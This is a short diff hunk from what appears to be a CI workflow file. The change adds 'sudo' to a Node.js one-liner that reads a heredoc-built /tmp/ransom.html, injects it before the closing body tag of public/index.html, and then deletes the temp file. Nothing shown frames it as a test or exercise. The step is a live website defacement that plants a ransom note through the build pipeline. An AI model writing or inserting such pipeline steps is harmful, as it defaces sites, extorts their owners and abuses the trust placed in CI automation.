@@ -115,7 +115,7 @@ jobs:
             RANSOM
             
             # Bulletproof HTML injection using Node.js to replace the closing body tag
-            node -e "const fs = require('fs'); let data = fs.readFileSync('public/index.html', 'utf8'); const ransom = fs.readFileSync('/tmp/ransom.html', 'utf8'); data = data.replace('</body>', ransom + '\n  </body>'); fs.writeFileSync('public/index.html', data);"
+            sudo node -e "const fs = require('fs'); let data = fs.readFileSync('public/index.html', 'utf8'); const ransom = fs.readFileSync('/tmp/ransom.html', 'utf8'); data = data.replace('</body>', ransom + '\n  </body>'); fs.writeFileSync('public/index.html', data);"
             
             sudo rm /tmp/ransom.html
             
